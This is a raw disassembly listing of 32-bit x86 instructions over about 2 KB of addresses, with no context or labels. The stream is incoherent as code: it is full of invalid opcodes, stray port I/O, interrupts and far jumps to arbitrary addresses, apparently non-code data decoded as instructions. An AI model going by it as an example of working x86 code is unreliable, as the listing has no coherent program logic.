  40ab57:	jge    0x40aaea
  40ab59:	pop    ebx
  40ab5a:	and    ah,BYTE PTR [edi-0x312f4720]
  40ab60:	fisubr WORD PTR [ebp-0x6ad20c1b]
  40ab66:	pop    edx
  40ab67:	pop    eax
  40ab68:	ds scas al,BYTE PTR es:[edi]
  40ab6a:	and    BYTE PTR [esi],al
  40ab6c:	test   al,0x8d
  40ab6e:	mov    ds:0x4c337161,eax
  40ab73:	jp     0x40abcb
  40ab75:	push   esp
  40ab76:	fild   WORD PTR [edi+0x60168ce]
  40ab7c:	and    DWORD PTR [eax+esi*8+0x20],edi
  40ab80:	sub    eax,DWORD PTR [ebp-0x5b]
  40ab83:	inc    ebx
  40ab84:	xchg   esi,eax
  40ab85:	sub    DWORD PTR [eax],ebx
  40ab87:	data16 sbb BYTE PTR [esi+0x15],dh
  40ab8b:	cwde   
  40ab8c:	add    eax,0x497b4e03
  40ab91:	sti    
  40ab92:	jbe    0x40ab79
  40ab94:	ret    0x5136
  40ab97:	push   esi
  40ab98:	(bad)  
  40ab99:	int    0xed
  40ab9b:	into   
  40ab9c:	push   es
  40ab9d:	or     ch,ah
  40ab9f:	xchg   edi,eax
  40aba0:	mov    eax,ds:0xeec6199e
  40aba5:	add    dh,ch
  40aba7:	add    BYTE PTR [edi+0x4997ad4b],bh
  40abad:	dec    eax
  40abae:	ins    BYTE PTR es:[edi],dx
  40abaf:	sbb    al,0x44
  40abb1:	jnp    0x40abef
  40abb3:	mov    edi,0xb9c8eb1
  40abb8:	or     BYTE PTR [ecx-0x6d],dl
  40abbb:	sti    
  40abbc:	or     ch,ch
  40abbe:	cmp    ah,BYTE PTR [esi-0x32]
  40abc1:	push   ecx
  40abc2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40abc3:	jbe    0x40ab82
  40abc5:	popa   
  40abc6:	sub    al,0x27
  40abc8:	mov    ebp,0x3bf8effb
  40abcd:	lock mov eax,ds:0x15f7146a
  40abd3:	pusha  
  40abd4:	pop    ecx
  40abd5:	retf   0xb358
  40abd8:	cmp    eax,0x892824bb
  40abdd:	pop    eax
  40abde:	adc    eax,DWORD PTR ds:0x1c90f9be
  40abe4:	mov    esi,0x2db663d2
  40abe9:	aam    0x83
  40abeb:	mov    bl,0x9
  40abed:	test   eax,0xbdc0294c
  40abf2:	push   0x17
  40abf4:	xchg   DWORD PTR [ecx],esp
  40abf6:	xor    dh,BYTE PTR [edi-0x4364cca6]
  40abfc:	aam    0x82
  40abfe:	(bad)  
  40abff:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ac00:	in     al,0x1d
  40ac02:	repz xchg esp,eax
  40ac04:	(bad)  
  40ac05:	mov    dl,0x4e
  40ac07:	xchg   esi,eax
  40ac08:	hlt    
  40ac09:	inc    edx
  40ac0a:	and    ch,BYTE PTR [ebx]
  40ac0c:	pop    edx
  40ac0d:	dec    ebp
  40ac0e:	std    
  40ac0f:	fsub   DWORD PTR [edi]
  40ac11:	mov    eax,0xcc2b4763
  40ac16:	push   cs
  40ac17:	mov    esp,0x275b12d8
  40ac1c:	add    edi,0x4e
  40ac1f:	inc    esp
  40ac20:	mov    eax,DWORD PTR [esi]
  40ac22:	inc    ebx
  40ac23:	test   DWORD PTR [ebx-0x66],0xbc00337f
  40ac2a:	out    dx,eax
  40ac2b:	xor    DWORD PTR [edx-0x32],edx
  40ac2e:	pop    esi
  40ac2f:	fisttp QWORD PTR [esp+ecx*8-0x2a479a1e]
  40ac36:	jmp    0xbdb1:0x7b9c073d
  40ac3d:	adc    dh,bl
  40ac3f:	(bad)  
  40ac41:	iret   
  40ac42:	ss ins BYTE PTR es:[edi],dx
  40ac44:	push   0x1004c9f
  40ac49:	es dec ebx
  40ac4b:	imul   esp,DWORD PTR [eax+0x26],0x47316fcd
  40ac52:	aaa    
  40ac53:	add    eax,DWORD PTR [ebx]
  40ac55:	add    DWORD PTR ds:0x1e39478f,0xffffff9b
  40ac5c:	inc    edx
  40ac5d:	imul   esp,DWORD PTR [ebx],0xb382edf0
  40ac63:	frstor [ebx+0x490b65ef]
  40ac69:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac6a:	in     al,0x3
  40ac6c:	sbb    eax,0xa5c96480
  40ac71:	fst    QWORD PTR [ebp+0x3a]
  40ac74:	pop    esi
  40ac75:	xchg   ebx,eax
  40ac76:	push   eax
  40ac77:	lock xchg edx,eax
  40ac79:	in     eax,dx
  40ac7a:	call   0x5066622d
  40ac7f:	scas   al,BYTE PTR es:[edi]
  40ac80:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ac81:	xor    esi,esi
  40ac83:	jbe    0x40acf0
  40ac85:	test   BYTE PTR [edx],al
  40ac87:	mov    ch,0x58
  40ac89:	les    ecx,FWORD PTR [ecx-0x7]
  40ac8c:	mov    ch,0xde
  40ac8e:	(bad)  
  40ac8f:	jecxz  0x40ac34
  40ac91:	inc    eax
  40ac92:	in     al,0xf4
  40ac94:	add    eax,ebx
  40ac96:	push   ecx
  40ac97:	nop
  40ac98:	inc    esi
  40ac99:	mov    al,0x8b
  40ac9b:	adc    al,0xc0
  40ac9d:	repz cmp edi,esp
  40aca0:	xchg   esi,eax
  40aca1:	or     BYTE PTR [edx+eiz*8+0x7ac16392],dh
  40aca8:	int    0x63
  40acaa:	cmp    eax,0xf4674175
  40acaf:	scas   al,BYTE PTR es:[edi]
  40acb0:	push   0xa93b29a0
  40acb5:	mov    ebp,0xc2275996
  40acba:	jecxz  0x40acac
  40acbc:	mov    dl,0x57
  40acbe:	mov    esp,0xe6faceb1
  40acc3:	ja     0x40ad1c
  40acc5:	cwde   
  40acc6:	and    DWORD PTR [edi+ecx*2+0x2d467679],0xffffffdd
  40acce:	mov    dh,0x15
  40acd0:	pop    ds
  40acd1:	adc    esi,edx
  40acd3:	xor    ah,bh
  40acd5:	fcomp  QWORD PTR [esi+edi*8]
  40acd8:	jae    0x40ad09
  40acda:	add    al,BYTE PTR [esi-0x6550e0bd]
  40ace0:	jp     0x40acd5
  40ace2:	fdiv   st(1),st
  40ace4:	cld    
  40ace5:	dec    ebp
  40ace6:	push   ebp
  40ace7:	cmc    
  40ace8:	push   ebp
  40ace9:	pop    ds
  40acea:	retf   
  40aceb:	lods   eax,DWORD PTR ds:[esi]
  40acec:	pop    ebp
  40aced:	push   0xffffffa9
  40acef:	xchg   edi,esi
  40acf1:	and    eax,0x4870a0eb
  40acf6:	push   esi
  40acf7:	push   ecx
  40acf8:	push   ebp
  40acf9:	cmp    al,0xe0
  40acfb:	cli    
  40acfc:	push   edi
  40acfd:	add    eax,esi
  40acff:	xor    BYTE PTR [ebx],cl
  40ad01:	or     BYTE PTR [ebx-0x241e082c],dl
  40ad07:	nop
  40ad08:	stos   BYTE PTR es:[edi],al
  40ad09:	push   esp
  40ad0a:	sub    dh,BYTE PTR [edx]
  40ad0c:	(bad)  
  40ad0d:	jl     0x40ad38
  40ad0f:	cmp    eax,0x4528482
  40ad14:	pusha  
  40ad15:	ret    
  40ad16:	push   eax
  40ad17:	stc    
  40ad18:	(bad)  ds:0xc7ff924d
  40ad1e:	push   es
  40ad1f:	mov    edx,DWORD PTR [esi+0x3ca8fea0]
  40ad25:	loope  0x40ad80
  40ad27:	leave  
  40ad28:	sti    
  40ad29:	push   es
  40ad2a:	dec    ecx
  40ad2b:	(bad)  
  40ad2c:	xchg   ebp,eax
  40ad2d:	jge    0x40ad2c
  40ad2f:	cmp    BYTE PTR [edx+0x3c570418],dh
  40ad35:	aad    0x8a
  40ad37:	add    al,0xce
  40ad39:	sub    DWORD PTR [edx+0x19],edi
  40ad3c:	retf   0x4284
  40ad3f:	and    BYTE PTR [eax+0x50],0x6
  40ad43:	mov    es,edi
  40ad45:	or     dl,BYTE PTR [esi+edi*8]
  40ad48:	jecxz  0x40ad8f
  40ad4a:	sbb    BYTE PTR [esi-0x13615e85],dl
  40ad50:	xor    eax,0xebe83fe4
  40ad55:	adc    edi,DWORD PTR [ebx+0x40]
  40ad58:	pop    ebx
  40ad59:	div    ah
  40ad5b:	das    
  40ad5c:	and    DWORD PTR [eax+ecx*1+0x64],0xffffffe1
  40ad61:	loope  0x40ad46
  40ad63:	mov    edx,DWORD PTR [ebx]
  40ad65:	arpl   WORD PTR [edi-0x7fd28653],si
  40ad6b:	jmp    0xd20a7b1d
  40ad70:	sbb    BYTE PTR [edi],al
  40ad72:	adc    ebp,DWORD PTR [edi+0x6b]
  40ad75:	call   0x1e3d1a07
  40ad7a:	imul   edx,DWORD PTR [ecx-0x60],0x36f1c225
  40ad81:	repnz sub eax,0xe1e17002
  40ad87:	push   esp
  40ad88:	test   al,0xd5
  40ad8b:	in     eax,dx
  40ad8c:	sti    
  40ad8d:	shr    cl,0x8c
  40ad90:	push   edx
  40ad91:	lahf   
  40ad92:	dec    ebp
  40ad93:	sub    al,0x8b
  40ad95:	or     DWORD PTR ds:0xb2d108b5,0xb21089d9
  40ad9f:	xchg   ebp,ebx
  40ada1:	sub    al,0x18
  40ada3:	popa   
  40ada4:	iret   
  40ada5:	jg     0x40ad79
  40ada7:	xor    dh,BYTE PTR [edx]
  40ada9:	pop    esp
  40adaa:	ret    
  40adab:	sbb    bl,BYTE PTR [edi+0x5e]
  40adae:	addr16 jg 0x40ad4b
  40adb1:	pop    esi
  40adb2:	and    DWORD PTR [eax-0x75],edi
  40adb5:	or     ch,dh
  40adb7:	cmc    
  40adb8:	(bad)  
  40adb9:	ja     0x40adfd
  40adbb:	pop    ds
  40adbc:	adc    al,0xa2
  40adbe:	add    edx,DWORD PTR [edx+0x75]
  40adc1:	xchg   BYTE PTR [eax-0x2b],ch
  40adc4:	inc    eax
  40adc5:	repnz or al,0x8d
  40adc8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adc9:	dec    esi
  40adca:	(bad)  
  40adcc:	jns    0x40ae2f
  40adce:	mov    esi,0x98b42767
  40add3:	mov    al,ds:0x1d306bf2
  40add8:	and    BYTE PTR [edx],bh
  40adda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40addb:	inc    ebx
  40addc:	fwait
  40addd:	repz icebp 
  40addf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ade0:	hlt    
  40ade1:	inc    edx
  40ade2:	sbb    DWORD PTR ss:[esi],0x6f
  40ade6:	pusha  
  40ade7:	inc    ecx
  40ade8:	pop    ebx
  40ade9:	pop    esi
  40adea:	clc    
  40adeb:	xchg   esp,eax
  40adec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aded:	repnz in al,dx
  40adef:	jnp    0x40adc1
  40adf1:	retf   0xa580
  40adf4:	inc    edx
  40adf5:	or     eax,0xbf68ce67
  40adfa:	and    eax,0x349dfe30
  40adff:	fld    DWORD PTR ds:0xad16d676
  40ae05:	xor    eax,0x367646b4
  40ae0a:	xchg   edx,eax
  40ae0b:	jge    0x40ae5f
  40ae0d:	clc    
  40ae0e:	int    0xff
  40ae10:	out    dx,eax
  40ae11:	cmp    cl,BYTE PTR [eax+0x2d]
  40ae14:	scas   eax,DWORD PTR es:[edi]
  40ae15:	cmp    eax,0xc266291c
  40ae1a:	jl     0x40ae0c
  40ae1c:	jge    0x40ae9b
  40ae1e:	or     al,0x84
  40ae20:	push   edx
  40ae21:	dec    edi
  40ae22:	fisttp WORD PTR [esi-0x4e]
  40ae25:	push   0x5b2a2af2
  40ae2a:	mov    eax,ds:0x770a772e
  40ae2f:	aam    0xe7
  40ae31:	inc    esp
  40ae32:	adc    eax,0x22f2636a
  40ae37:	jae    0x40ae05
  40ae39:	popf   
  40ae3a:	aad    0x58
  40ae3c:	test   DWORD PTR [edx-0x3f],edx
  40ae3f:	jae    0x40aeb4
  40ae41:	mov    dl,0x6c
  40ae43:	shl    edx,0xa4
  40ae46:	xchg   edi,eax
  40ae47:	mov    dl,bh
  40ae49:	mov    al,BYTE PTR [edx+eax*1-0x545ffbf1]
  40ae50:	adc    esi,0x51
  40ae53:	jo     0x40add8
  40ae55:	or     eax,0xfb5a8b59
  40ae5a:	dec    esp
  40ae5b:	cmp    bh,cl
  40ae5d:	clc    
  40ae5e:	sub    al,0x18
  40ae60:	mov    esp,0xd8b1c6cf
  40ae65:	mov    bl,0xeb
  40ae67:	ret    
  40ae68:	jmp    0x4de49d00
  40ae6d:	clc    
  40ae6e:	push   ecx
  40ae6f:	and    eax,0x7969610
  40ae74:	jmp    0x40ae9d
  40ae76:	sahf   
  40ae77:	stc    
  40ae78:	ss pop esi
  40ae7a:	jo     0x40ae86
  40ae7c:	test   BYTE PTR [eax+0x197f0613],bl
  40ae82:	neg    BYTE PTR [edx-0x79]
  40ae85:	mov    WORD PTR [ecx],?
  40ae87:	dec    edi
  40ae88:	jbe    0x40aec8
  40ae8a:	popa   
  40ae8b:	xchg   esp,eax
  40ae8c:	retf   
  40ae8d:	dec    esp
  40ae8e:	add    esp,esp
  40ae90:	mov    eax,0x4000ab24
  40ae95:	aaa    
  40ae96:	(bad)  [edi+0x38edc8c8]
  40ae9c:	xor    al,0xba
  40ae9e:	repz adc al,0x1
  40aea1:	popf   
  40aea2:	adc    esi,DWORD PTR [esi+0x2d]
  40aea5:	sub    ebx,DWORD PTR [eax+0xf442711]
  40aeab:	jle    0x40ae54
  40aead:	outs   dx,BYTE PTR ds:[esi]
  40aeae:	mov    eax,ds:0x55510470
  40aeb3:	int    0xb1
  40aeb5:	jns    0x40aeef
  40aeb7:	imul   edi,DWORD PTR [edx-0x67],0x19ee8b1
  40aebe:	adc    DWORD PTR [eax+esi*8-0x163351d7],0xffffffc5
  40aec6:	sub    BYTE PTR [esi+0x46d421a],0x8b
  40aecd:	push   ebx
  40aece:	ret    
  40aecf:	sbb    al,0xb6
  40aed1:	add    cl,0x61
  40aed4:	retf   
  40aed5:	clc    
  40aed6:	mov    ?,WORD PTR [ebx+0x21]
  40aed9:	clc    
  40aeda:	sub    eax,0x2f09def0
  40aedf:	popf   
  40aee0:	test   eax,0x9d8cdff3
  40aee5:	nop
  40aee6:	retf   
  40aee7:	or     dl,bl
  40aee9:	add    al,0x3b
  40aeeb:	sub    ebp,DWORD PTR [ecx+0x35]
  40aeee:	es jae 0x40aeb5
  40aef1:	push   es
  40aef2:	int3   
  40aef3:	hlt    
  40aef4:	mov    cl,BYTE PTR [esi]
  40aef6:	sbb    BYTE PTR [ebx+0x3c479dd8],dh
  40aefc:	mov    al,0xab
  40aefe:	shl    DWORD PTR [edx],1
  40af00:	mov    WORD PTR [ecx+edx*8],ds
  40af03:	push   eax
  40af04:	mov    ah,0x96
  40af06:	add    ecx,DWORD PTR [esi]
  40af08:	cmp    BYTE PTR [esi-0x78e04d24],cl
  40af0e:	scas   al,BYTE PTR es:[edi]
  40af0f:	sub    BYTE PTR [ebx],bl
  40af11:	and    ecx,DWORD PTR [edi-0x16482955]
  40af17:	ja     0x40af0c
  40af19:	sbb    esp,DWORD PTR [edx+0x76c2353a]
  40af1f:	mov    bh,0x51
  40af21:	xchg   ebx,eax
  40af22:	mov    ds:0x194638d6,al
  40af27:	aad    0xf4
  40af29:	mov    edx,0xf1a029bb
  40af2e:	and    al,0xb
  40af30:	imul   edx,esp,0x17
  40af33:	pop    ss
  40af34:	mov    dh,0x38
  40af36:	fsub   st,st(2)
  40af38:	dec    ebp
  40af39:	xchg   ecx,eax
  40af3a:	stos   BYTE PTR es:[edi],al
  40af3b:	pop    es
  40af3c:	jno    0x40af87
  40af3e:	cmp    DWORD PTR [eax+0xc],eax
  40af41:	pop    edx
  40af42:	les    ebx,FWORD PTR [ebp+0xf91224f]
  40af48:	ret    
  40af49:	punpcklwd mm5,mm5
  40af4c:	cmp    eax,0x606c26f0
  40af51:	into   
  40af52:	in     eax,0xec
  40af54:	out    dx,eax
  40af55:	out    dx,eax
  40af56:	pop    edx
  40af57:	rcr    BYTE PTR [edi],cl
  40af59:	dec    edi
  40af5a:	sub    eax,0x3c5a5797
  40af5f:	shl    bl,0x27
  40af62:	mov    ds:0x8f9faaf8,eax
  40af67:	pop    ebx
  40af68:	jae    0x40af51
  40af6a:	or     DWORD PTR [ecx-0x5194f215],esp
  40af70:	sahf   
  40af71:	pop    edx
  40af72:	inc    ecx
  40af73:	mov    ebx,0x9413f812
  40af78:	dec    edx
  40af79:	cdq    
  40af7a:	jne    0x40af27
  40af7c:	test   al,0xc0
  40af7e:	sub    edi,ebx
  40af80:	push   ebp
  40af81:	aam    0x69
  40af83:	out    0xcd,eax
  40af85:	xor    eax,0x594c90b3
  40af8a:	icebp  
  40af8b:	in     al,0x56
  40af8d:	add    BYTE PTR [esi+0x12],cl
  40af90:	sbb    ecx,0xffffffa0
  40af93:	push   esp
  40af94:	jle    0x40afd1
  40af96:	int3   
  40af97:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40af98:	lock and BYTE PTR [ecx-0xd],0x15
  40af9d:	arpl   WORD PTR [edi+0x6f],bx
  40afa0:	enter  0x1ca8,0xc0
  40afa4:	pop    es
  40afa5:	lahf   
  40afa6:	shr    BYTE PTR [eax-0x5e7089ac],cl
  40afac:	or     eax,0xf44861b6
  40afb1:	and    eax,0x4fd3374b
  40afb6:	push   ecx
  40afb7:	push   edx
  40afb8:	cmp    al,0xad
  40afba:	dec    ebp
  40afbb:	adc    DWORD PTR [edx+ebp*4],0xee4ec270
  40afc2:	xacquire xchg DWORD PTR ds:0x2ff2cd18,esi
  40afc9:	and    eax,0xf321fb39
  40afce:	mov    esp,0x990b191b
  40afd3:	lock push cs
  40afd5:	dec    esp
  40afd6:	and    cl,0xc4
  40afd9:	mov    edi,0x2295ab7e
  40afde:	cld    
  40afdf:	test   DWORD PTR [esi-0x747e5f],0xe9a2b173
  40afe9:	cdq    
  40afea:	sbb    bl,ch
  40afec:	arpl   cx,di
  40afee:	lods   al,BYTE PTR ds:[esi]
  40afef:	hlt    
  40aff0:	jnp    0x40afa7
  40aff2:	mov    eax,ds:0x32463478
  40aff7:	and    dh,BYTE PTR [ecx]
  40aff9:	dec    edi
  40affa:	imul   edi,DWORD PTR [edx-0x3780d045],0xffffffdd
  40b001:	sub    eax,0x85a8b7fe
  40b006:	ins    DWORD PTR es:[edi],dx
  40b007:	dec    esi
  40b008:	mov    eax,ds:0xc17e99a4
  40b00d:	sar    DWORD PTR [edx+0x26],cl
  40b010:	fs scas eax,DWORD PTR es:[edi]
  40b012:	sbb    cl,dl
  40b014:	stos   DWORD PTR es:[edi],eax
  40b015:	fnstcw WORD PTR [edi+0x2994da2c]
  40b01b:	gs addr16 iret 
  40b01e:	mov    al,ds:0x24f75d2c
  40b023:	inc    esi
  40b024:	imul   ebx,edx,0x4e51ae5a
  40b02a:	sub    ebx,DWORD PTR [eax+ebp*1]
  40b02d:	lahf   
  40b02e:	sub    cl,BYTE PTR [esi]
  40b030:	mov    bh,0xfd
  40b032:	mov    ds:0xa3596b37,eax
  40b037:	ret    
  40b038:	leave  
  40b039:	xor    ebx,DWORD PTR [ecx+0x53500eb0]
  40b03f:	jge    0x40b070
  40b041:	stc    
  40b042:	fdivp  st(4),st
  40b044:	inc    esi
  40b045:	(bad)  
  40b046:	nop
  40b047:	outs   dx,BYTE PTR ds:[esi]
  40b048:	cmp    edx,esi
  40b04a:	bound  ebx,QWORD PTR [eax-0x7a]
  40b04d:	inc    edi
  40b04e:	pop    ds
  40b04f:	cmp    BYTE PTR [esi-0x5f0eca48],cl
  40b055:	dec    edx
  40b056:	or     ch,al
  40b058:	push   0x174c90a1
  40b05d:	loope  0x40b0d1
  40b05f:	out    dx,al
  40b060:	pop    ds
  40b061:	das    
  40b062:	mov    cl,0x26
  40b064:	fstp   QWORD PTR [ecx]
  40b066:	cmp    bl,al
  40b068:	inc    esp
  40b069:	mov    edi,0x99d1b1c9
  40b06e:	(bad)  
  40b06f:	out    dx,eax
  40b070:	jns    0x40b05c
  40b072:	daa    
  40b073:	mov    ebp,0xf01b20c0
  40b078:	rol    DWORD PTR [edi],cl
  40b07a:	stc    
  40b07b:	lahf   
  40b07c:	pushf  
  40b07d:	call   0xcf91f699
  40b082:	ret    
  40b083:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b084:	or     eax,0xc85adb75
  40b089:	ss push eax
  40b08b:	loop   0x40b089
  40b08d:	inc    esp
  40b08e:	enter  0x6d3f,0xd3
  40b092:	loop   0x40b016
  40b094:	and    DWORD PTR ds:0xfd8fbd47,ebp
  40b09a:	inc    edi
  40b09b:	jp     0x40b045
  40b09d:	push   es
  40b09e:	fcmovne st,st(1)
  40b0a0:	mov    dl,BYTE PTR [ecx+0x5deef8d2]
  40b0a6:	fnsave [edx+edx*4]
  40b0a9:	and    esp,DWORD PTR [ecx-0x1158cec6]
  40b0af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0b0:	les    ecx,FWORD PTR [ebx-0x42]
  40b0b3:	hlt    
  40b0b4:	dec    esp
  40b0b5:	lods   al,BYTE PTR ds:[esi]
  40b0b6:	push   esp
  40b0b7:	mov    esp,0xbf65f4db
  40b0bc:	stos   DWORD PTR es:[edi],eax
  40b0bd:	or     eax,0x37568ae
  40b0c2:	jp     0x40b0c2
  40b0c4:	mov    esi,0xaac626c4
  40b0c9:	ins    BYTE PTR es:[edi],dx
  40b0ca:	lods   al,BYTE PTR ds:[esi]
  40b0cb:	shl    DWORD PTR [ebp+ebx*8+0x75],cl
  40b0cf:	cmp    eax,0x5cd2a713
  40b0d4:	fcmovbe st,st(0)
  40b0d6:	lods   al,BYTE PTR ds:[esi]
  40b0d7:	add    DWORD PTR [ebp+0x126e5f01],ecx
  40b0dd:	push   edi
  40b0de:	cs addr16 nop
  40b0e1:	adc    ebp,esp
  40b0e3:	push   0xf41560d2
  40b0e8:	test   al,0xd2
  40b0ea:	pop    ds
  40b0eb:	call   0xe092:0x9070fe83
  40b0f2:	mov    BYTE PTR [ebx],al
  40b0f4:	retf   
  40b0f5:	daa    
  40b0f6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b0f7:	add    BYTE PTR [edi+0x67],dl
  40b0fa:	mov    esp,DWORD PTR [esi+ebp*8+0x42]
  40b0fe:	pop    ebp
  40b0ff:	lods   eax,DWORD PTR ds:[esi]
  40b100:	mov    DWORD PTR [esi+0x32000c63],eax
  40b106:	inc    esp
  40b107:	or     eax,0x2a57bebf
  40b10c:	push   edx
  40b10d:	cs (bad) 
  40b10f:	div    dh
  40b111:	xchg   esp,eax
  40b112:	leave  
  40b113:	adc    al,al
  40b115:	xor    al,0xd
  40b117:	outs   dx,DWORD PTR ds:[esi]
  40b118:	ds pop eax
  40b11a:	xchg   edx,eax
  40b11b:	nop
  40b11c:	pop    ds
  40b11d:	xor    al,0x32
  40b11f:	(bad)  
  40b121:	lods   al,BYTE PTR ds:[esi]
  40b122:	(bad)  
  40b123:	into   
  40b124:	out    0xf2,eax
  40b126:	cmp    esp,DWORD PTR [ecx-0x59c4ac5e]
  40b12c:	mov    ebp,DWORD PTR [ebp+eiz*8-0x61]
  40b130:	ds addr16 and eax,0xf274e60d
  40b137:	stos   BYTE PTR es:[edi],al
  40b138:	arpl   WORD PTR [edi+0x57015a74],si
  40b13e:	mov    edx,0x71e2d875
  40b143:	sbb    eax,0xdfc105b9
  40b148:	adc    dl,BYTE PTR [eax-0x7f]
  40b14b:	nop
  40b14c:	mov    esi,0x90499339
  40b151:	nop
  40b152:	sbb    cl,BYTE PTR [ebp+0x6]
  40b155:	ins    BYTE PTR es:[edi],dx
  40b156:	(bad)
  40b15a:	mov    ebp,0x7445f45d
  40b15f:	xor    al,0xd5
  40b161:	iret   
  40b162:	push   es
  40b163:	xor    bl,BYTE PTR [edi]
  40b165:	push   ds
  40b166:	dec    ecx
  40b167:	and    edi,0x39
  40b16a:	add    eax,0x12a68bf4
  40b16f:	lahf   
  40b170:	arpl   WORD PTR [ebx+0x3def32e9],cx
  40b176:	rcl    BYTE PTR [edi],0xf2
  40b179:	add    eax,0xe3fa4062
  40b17e:	dec    edi
  40b17f:	cli    
  40b180:	inc    esi
  40b181:	sub    DWORD PTR [ecx],esi
  40b183:	cs xchg ecx,eax
  40b185:	jno    0x40b133
  40b187:	(bad)  
  40b188:	mov    ebp,gs
  40b18a:	push   esp
  40b18b:	or     BYTE PTR [eax+0x12],al
  40b18e:	cmp    ecx,0x2a7f9a46
  40b194:	dec    edi
  40b195:	adc    al,0x5
  40b197:	add    BYTE PTR [eax+0x3bf68240],bh
  40b19d:	clc    
  40b19e:	icebp  
  40b19f:	xor    esi,ecx
  40b1a1:	outs   dx,BYTE PTR ds:[esi]
  40b1a2:	fs fwait
  40b1a4:	test   DWORD PTR [eax-0x6ed41b3c],ebx
  40b1aa:	inc    ebx
  40b1ab:	dec    esi
  40b1ac:	ds xchg edx,eax
  40b1ae:	arpl   bp,dx
  40b1b0:	hlt    
  40b1b1:	rol    DWORD PTR ds:0x82726b3a,1
  40b1b7:	fstp   QWORD PTR [ebx-0x42d50048]
  40b1bd:	jnp    0x40b172
  40b1bf:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1c0:	ds call 0x575c:0x8605b6c0
  40b1c8:	and    cl,BYTE PTR [ebx-0x9]
  40b1cb:	xchg   esi,eax
  40b1cc:	int3   
  40b1cd:	lahf   
  40b1ce:	int    0x43
  40b1d0:	sbb    al,0x9d
  40b1d2:	and    ebp,DWORD PTR [edi+0x6]
  40b1d5:	xchg   ecx,eax
  40b1d6:	pusha  
  40b1d7:	pusha  
  40b1d8:	cmp    BYTE PTR [ecx-0x7d],bl
  40b1db:	push   cs
  40b1dc:	mov    dl,0xa6
  40b1de:	mov    esp,0xec73affe
  40b1e3:	aad    0x37
  40b1e5:	stc    
  40b1e6:	jecxz  0x40b236
  40b1e8:	shl    al,0x9
  40b1eb:	and    DWORD PTR [ecx+0x7973aca5],ebp
  40b1f1:	in     eax,dx
  40b1f2:	mov    gs,WORD PTR [ebx+0xb]
  40b1f5:	sbb    al,0x7e
  40b1f7:	ds leave 
  40b1f9:	push   eax
  40b1fa:	or     DWORD PTR [ebx+0x297f33dc],edi
  40b200:	sub    DWORD PTR [eax+0x61],esp
  40b203:	mov    esi,0xeb5e0b09
  40b208:	jp     0x40b279
  40b20a:	ds aaa 
  40b20c:	or     DWORD PTR [edi-0x2],ecx
  40b20f:	pop    esi
  40b210:	iret   
  40b211:	je     0x40b246
  40b213:	icebp  
  40b214:	(bad)  
  40b215:	nop
  40b216:	sahf   
  40b217:	ror    DWORD PTR [eax],cl
  40b219:	cld    
  40b21a:	adc    eax,esi
  40b21c:	xor    ebp,edi
  40b21e:	push   ss
  40b21f:	adc    BYTE PTR cs:[esi],dh
  40b222:	pop    ecx
  40b223:	xchg   DWORD PTR [esi+0x188b7513],ecx
  40b229:	in     al,0xb
  40b22b:	mov    esp,eax
  40b22d:	push   ecx
  40b22e:	xchg   esp,eax
  40b22f:	xchg   esp,eax
  40b230:	dec    edx
  40b231:	enter  0xa412,0x46
  40b235:	out    0x4b,eax
  40b237:	inc    ecx
  40b238:	cmp    BYTE PTR [edi],0xee
  40b23b:	and    DWORD PTR [ecx*4-0x666dd885],ecx
  40b242:	fisubr WORD PTR [eax+esi*4-0x57e91fd4]
  40b249:	xor    al,0xc
  40b24b:	sbb    dl,BYTE PTR [eax-0x1c]
  40b24e:	jmp    0x40b219
  40b250:	jb     0x40b2c3
  40b252:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b253:	jns    0x40b272
  40b255:	sub    bl,0xd2
  40b258:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b259:	ss and eax,0x1021e592
  40b25f:	jge    0x40b295
  40b261:	mov    dh,0x6f
  40b263:	dec    ebp
  40b264:	popf   
  40b265:	xchg   ecx,eax
  40b266:	out    dx,al
  40b267:	inc    ecx
  40b268:	mov    ebx,0xfd6cbaca
  40b26d:	and    esi,edi
  40b26f:	cli    
  40b270:	int    0x50
  40b272:	jle    0x40b2b0
  40b274:	or     bh,al
  40b276:	(bad)  
  40b277:	ds out 0x7b,eax
  40b27a:	dec    ebx
  40b27b:	cmp    ebx,DWORD PTR [edi]
  40b27d:	adc    ebx,ecx
  40b27f:	iret   
  40b280:	repnz mov bl,0xcf
  40b283:	ret    0x7962
  40b286:	adc    ah,BYTE PTR [edx]
  40b288:	jno    0x40b218
  40b28a:	in     eax,0x1e
  40b28c:	mov    WORD PTR [ecx],ss
  40b28e:	outs   dx,BYTE PTR ds:[esi]
  40b28f:	sbb    ebp,edx
  40b291:	(bad)  
  40b292:	fdiv   DWORD PTR [edx+0xe]
  40b295:	and    al,0xee
  40b297:	adc    al,0x26
  40b299:	es js  0x40b2da
  40b29c:	jb     0x40b2ea
  40b29e:	dec    edi
  40b29f:	out    dx,eax
  40b2a0:	xchg   BYTE PTR [edx-0x66],ch
  40b2a3:	inc    ebx
  40b2a4:	jp     0x40b306
  40b2a6:	sbb    esi,DWORD PTR [ebp+0x7140f607]
  40b2ac:	add    ebp,esp
  40b2ae:	test   BYTE PTR [edx-0x5a],cl
  40b2b1:	rol    DWORD PTR [edx],cl
  40b2b3:	retf   0xf9da
  40b2b6:	mov    edx,0x71821fc9
  40b2bb:	mov    ebp,0x1602716a
  40b2c0:	outs   dx,DWORD PTR ds:[esi]
  40b2c1:	mov    es,WORD PTR [ecx-0x70]
  40b2c4:	stc    
  40b2c5:	pop    esp
  40b2c6:	int    0xc5
  40b2c8:	dec    esi
  40b2c9:	ror    BYTE PTR [ebp+eiz*2+0x6d23326f],0x47
  40b2d1:	pushf  
  40b2d2:	out    dx,al
  40b2d3:	daa    
  40b2d4:	mov    al,0xb8
  40b2d6:	pop    eax
